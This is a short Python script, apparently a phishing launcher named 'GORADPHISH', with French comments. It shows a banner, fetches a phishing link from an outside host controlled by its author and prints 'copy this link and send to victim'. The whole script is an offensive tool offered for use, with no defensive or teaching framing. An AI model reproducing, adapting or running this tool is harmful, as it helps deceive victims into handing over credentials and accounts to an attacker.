import requests
import time
import os
from colorama import Fore, Style
import pyfiglet

def get_dynamic_url():
    url_api = "https://cybergorad.alwaysdata.net/urls.php"  # API qui fournit l'URL
    try:
        response = requests.get(url_api)
        
        if response.status_code == 200:
            data = response.json()  # Convertit la réponse JSON en dictionnaire
            return data.get("url", "URL non disponible")
        else:
            return f"Erreur HTTP : {response.status_code}"

    except requests.exceptions.RequestException as e:
        return f"Erreur de connexion : {str(e)}"
    except ValueError:
        return "Erreur : Réponse JSON invalide"

def afficher_titre():
    os.system('clear')  # Efface l'écran (sous Linux et macOS)
    titre = pyfiglet.figlet_format("GORADPHISH")
    
    print("Auteur: cybergorad")
    print("Version: 1.0.1")
    print("")
    print("MODE : CUSTOM")
    print("")
    
    print(Fore.CYAN + titre + Style.RESET_ALL)
    print("LOADING ..")
    time.sleep(3)
    print("")

    # Récupérer l'URL dynamique
    url_dynamique = get_dynamic_url()
    print("copy this link and send to victim : " + Fore.CYAN + url_dynamique + Style.RESET_ALL)

# Exécuter le programme
afficher_titre()
